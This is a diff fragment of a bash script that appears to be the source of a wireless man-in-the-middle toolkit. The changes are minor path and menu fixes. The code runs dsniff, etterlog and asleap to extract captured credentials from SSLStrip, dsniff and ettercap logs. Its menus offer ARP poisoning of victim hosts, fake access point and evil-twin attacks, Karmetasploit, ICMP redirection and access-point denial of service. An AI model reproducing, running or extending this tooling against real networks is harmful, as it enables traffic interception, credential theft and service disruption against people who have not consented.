+	elif [ -s ${PWD}/strip-accts.txt ] && [ ! -z ${isxrunning} ]; then
+	 xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e cat ${PWD}/strip-accts.txt &
 	else
 	 echo -e "\n\e[1;31m[-] Sorry no credentials captured...\e[0m"
 	fi
@@ -1297,10 +1305,9 @@ f_SSLStrip(){
 f_dsniff(){
 	clear
 	f_Banner
-
 	if [ -d ${logfldr} ]; then
 	  echo "Dsniff logs in current log folder:"
-	  ls ${logfldr}/ 2>/dev/null
+	  ls ${logfldr}/dsniff* 2>/dev/null
 	  echo -e "\n\n"
 	fi
 
@@ -1311,16 +1318,15 @@ f_dsniff(){
 
 	dsniff -r ${DSNIFFPATH} >> /${PWD}/dsniff-log.txt
 	if [ -z ${isxrunning} ];then
-	 cat /${PWD}/dnsiff-log.txt | less
+	 cat ${PWD}/dnsiff-log.txt | less
 	else
-	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Dsniff Accounts" -e cat /${PWD}/dsniff-log.txt &
+	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Dsniff Accounts" -e cat ${PWD}/dsniff-log.txt &
 	fi
 }
 ##################################################
 f_EtterLog(){
 	clear
 	f_Banner
-
 	if [ -d ${logfldr} ]; then
 	  echo "Ettercap logs in current log folder:"
 	  ls ${logfldr}/*.eci 2>/dev/null
@@ -1330,16 +1336,15 @@ f_EtterLog(){
 	ETTERECI=
 	while [ -z ${ETTERECI} ] || [ ! -f "${ETTERECI}" ]; do read -e -p "Enter the full path to your ettercap.eci log file: " ETTERECI; done
 
-	etterlog -p "${ETTERECI}" >> /${PWD}/etterlog.txt
+	etterlog -p "${ETTERECI}" >> ${PWD}/etterlog.txt
 	if [ -z ${isxrunning} ]; then
-	 cat /${PWD}/etterlog.txt | less
+	 cat ${PWD}/etterlog.txt | less
 	else
-	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Ettercap Accounts" -e cat /${PWD}/etterlog.txt &
+	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Ettercap Accounts" -e cat ${PWD}/etterlog.txt &
 	fi
 }
 ##################################################
 f_freeradiuscreds(){
-
 while [ -z "${credlist}" ] && [ ! -e "${credlist}" ]; do
 	echo -n -e "\nPlease enter the path to your FreeRadius Attack credential list"
 	read -e -p ": " credlist
@@ -1350,7 +1355,7 @@ while [ -z "${wordlist}" ] && [ ! -e "${wordlist}" ]; do
 	read -e -p ": " wordlist
 done
 
-	echo -n -e "\n\e[1;33m[*] Please standby, this may take a while...\e[0m"
+echo -n -e "\n\e[1;33m[*] Please standby, this may take a while...\e[0m"
 
 acreds="${PWD}/asleap-creds-$(date +%F-%H%M).txt"
 touch ${acreds}
@@ -1394,7 +1399,6 @@ f_Banner(){
 f_prereqs(){
 	clear
 	f_Banner
-
 	echo "1.  Edit etter.conf"
 	echo "2.  Edit etter.dns"
 	echo "3.  Install dhcp server"
@@ -1410,7 +1414,7 @@ f_prereqs(){
 	case ${prereqschoice} in
 	1) f_nanoetter ;;
 	2) f_nanoetterdns ;;
-	3) f_dhcp3install ;;
+	3) f_dhcp_server_install ;;
 	4) f_karmareqs ;;
 	5) f_addtunnel ;;
 	6) f_msfupdate ;;
@@ -1424,7 +1428,6 @@ f_prereqs(){
 f_poisoning(){
 	clear
 	f_Banner
-
 	echo "1.  Create Victim Host List"
 	echo "2.  Standard ARP Poison"
 	echo "3.  Oneway ARP Poison"
@@ -1450,7 +1453,6 @@ f_poisoning(){
 f_fakeapattacks(){
 	clear
 	f_Banner
-
 	echo "1.  FakeAP Attack Static"
 	echo "2.  FakeAP Attack EvilTwin"
 	echo "3.  Karmetasploit Attack"
@@ -1474,7 +1476,6 @@ f_fakeapattacks(){
 f_DoSOptions(){
 	clear
 	f_Banner
-
 	echo "1. Attack a Single or Multiple APs"
 	echo "2. Last Man Standing (Use with Caution)"
 	echo "3. Previous Menu"
@@ -1492,7 +1493,6 @@ f_DoSOptions(){
 f_DataReviewMenu(){
 	clear
 	f_Banner
-
 	echo "1.  Parse SSLStrip log for credentials"
 	echo "2.  Parse dsniff file for credentials"
 	echo "3.  Parse ettercap eci file for credentials"
@@ -1514,7 +1514,6 @@ f_DataReviewMenu(){
 f_ICMP(){
 	clear
 	f_Banner
-
 	echo "\n*** If you are connected to a switch this attack won't work! ***"
 	echo -e "*** You must be able to see ALL traffic for this attack to work. ***\n\n"
 	read -p "Are you connected to a switch [y/N]: " icmpswitch
@@ -1529,7 +1528,6 @@ f_ICMP(){
 f_mainmenu(){
 	clear
 	f_Banner
-
 	echo "1.  Prerequisites & Configurations"
 	echo "2.  Poisoning Attacks"
 	echo "3.  FakeAP Attacks"
@@ -1559,7 +1557,6 @@ else
 	mkdir /tmp/ec
 	f_isxrunning
 	f_xtermwindows
-	f_findpaths
 	clean=1
 	f_mainmenu
 fi
